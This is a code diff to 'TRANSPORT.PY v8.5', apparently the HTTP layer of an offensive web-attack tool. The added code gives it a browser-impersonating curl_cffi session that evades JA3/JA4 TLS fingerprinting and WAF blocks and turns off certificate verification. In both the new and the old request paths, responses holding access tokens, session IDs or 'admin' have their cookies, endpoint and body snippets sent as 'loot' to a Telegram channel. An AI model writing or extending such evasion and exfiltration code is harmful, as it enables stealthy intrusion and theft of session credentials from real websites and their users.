@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-TRANSPORT.PY v8.5 — Centralized Stealth HTTP, TLS Evasion & Behavioral Middleware
+TRANSPORT.PY v8.5 — Centralized Stealth HTTP, Adversarial TLS & Behavioral Middleware
 Features:
-- Advanced TLS spoofing (JA3/JA4 fingerprint evasion via spoofed SSL contexts)
+- Advanced browser fingerprint impersonation (JA3/JA4 evasion via curl_cffi & spoofed SSL contexts)
 - Poisson behavioral timing jitter and randomized browser client hints
 - Robust cookie-jar state synchronization & header rotation
 - Resilient connection error handling with jittered retry loops
@@ -17,8 +17,8 @@ import asyncio
 import random
 from urllib.parse import urlsplit
 
-# Import advanced evasion, behavioral modules, and Telegram notifier
-from modules.tls_evasion import create_spoofed_ssl_context
+# Import advanced adversarial TLS evasion, behavioral modules, and Telegram notifier
+from modules.tls_evasion import create_spoofed_ssl_context, AdversarialTLSSession, CFFI_AVAILABLE
 from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 from modules.telegram_notifier import send_telegram_alert
 
@@ -40,13 +40,18 @@ def broadcast_tg_alert_sync(loot_type, details):
             pass
 
 class SecureTransport:
-    def __init__(self, target_url):
+    def __init__(self, target_url, browser_profile="chrome120"):
         parsed = urlsplit(target_url)
+        self.target_url = target_url
         self.host = parsed.hostname
         self.secure = parsed.scheme == "https"
         self.port = parsed.port or (443 if self.secure else 80)
         self.base_path = parsed.path.rstrip("/")
         self.cookie_jar = {}
+        
+        # Initialize adversarial TLS session manager for advanced fingerprinting
+        self.adversarial_tls = AdversarialTLSSession(self.host, browser_profile=browser_profile)
+        self.cffi_session = self.adversarial_tls.get_impersonated_session() if CFFI_AVAILABLE else None
 
     def update_cookies(self, set_cookie_header):
         if not set_cookie_header:
@@ -73,7 +78,61 @@ class SecureTransport:
         apply_behavioral_jitter()
 
         endpoint = f"{self.base_path}{path}" if not path.startswith(self.base_path) else path
-        
+        full_url = f"{self.target_url.rstrip('/')}{path}" if not path.startswith("http") else path
+
+        # ======================================================
+        # PREFERRED PATH: curl_cffi Adversarial Browser Session
+        # ======================================================
+        if self.cffi_session and self.secure:
+            headers = {
+                "User-Agent": random.choice(USER_AGENTS),
+                "Accept": "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+            }
+            headers.update(get_randomized_hints())
+            cookie_str = self.get_cookie_header_value()
+            if cookie_str:
+                headers["Cookie"] = cookie_str
+            if extra_headers:
+                headers.update(extra_headers)
+
+            for attempt in range(retries):
+                try:
+                    if method.upper() == "GET":
+                        res = self.cffi_session.get(full_url, headers=headers, timeout=10, verify=False)
+                    elif method.upper() == "POST":
+                        res = self.cffi_session.post(full_url, json=payload, headers=headers, timeout=10, verify=False)
+                    elif method.upper() == "PUT":
+                        res = self.cffi_session.put(full_url, json=payload, headers=headers, timeout=10, verify=False)
+                    else:
+                        res = self.cffi_session.request(method, full_url, json=payload, headers=headers, timeout=10, verify=False)
+
+                    resp_headers = {k.lower(): v for k, v in res.headers.items()}
+                    if "set-cookie" in resp_headers:
+                        self.update_cookies(resp_headers["set-cookie"])
+
+                    data = res.text
+                    body_lower = data.lower()
+                    if res.status_code in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin"]):
+                        transport_loot = {
+                            "endpoint": full_url,
+                            "status": res.status_code,
+                            "cookie_jar": self.get_cookie_header_value(),
+                            "response_snippet": data[:300]
+                        }
+                        broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)
+
+                    return res.status_code, resp_headers, data
+
+                except Exception:
+                    if attempt < retries - 1:
+                        time.sleep(0.4 * (attempt + 1))
+                        continue
+            # Fallback to standard http.client if cffi session encounters persistent errors
+
+        # ======================================================
+        # FALLBACK PATH: Low-level http.client with Spoofed SSL
+        # ======================================================
         headers = {
             "Host": self.host,
             "User-Agent": random.choice(USER_AGENTS),
@@ -81,8 +140,6 @@ class SecureTransport:
             "Accept-Language": "en-US,en;q=0.5",
             "Connection": "close"
         }
-
-        # Inject randomized browser client hints & evasive headers
         headers.update(get_randomized_hints())
 
         cookie_str = self.get_cookie_header_value()
@@ -97,13 +154,11 @@ class SecureTransport:
             body = json.dumps(payload).encode("utf-8")
             headers["Content-Type"] = "application/json"
 
-        # Retry loop to handle abrupt WAF socket drops and TLS EOF errors gracefully
         for attempt in range(retries):
             conn = None
             try:
                 if self.secure:
-                    # Use browser-grade TLS spoofed context to bypass JA3/JA4 edge blocks
-                    ctx = create_spoofed_ssl_context()
+                    ctx = create_spoofed_ssl_context(self.host)
                     conn = http.client.HTTPSConnection(self.host, self.port, timeout=10, context=ctx)
                 else:
                     conn = http.client.HTTPConnection(self.host, self.port, timeout=10)
@@ -113,11 +168,9 @@ class SecureTransport:
                 data = res.read(512 * 1024).decode("utf-8", errors="replace")
                 resp_headers = {k.lower(): v for k, v in res.getheaders()}
 
-                # Automatically capture any new Set-Cookie headers
                 if "set-cookie" in resp_headers:
                     self.update_cookies(resp_headers["set-cookie"])
 
-                # Check for high-value authentication or session tokens in successful transport responses
                 body_lower = data.lower()
                 if res.status in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin"]):
                     transport_loot = {
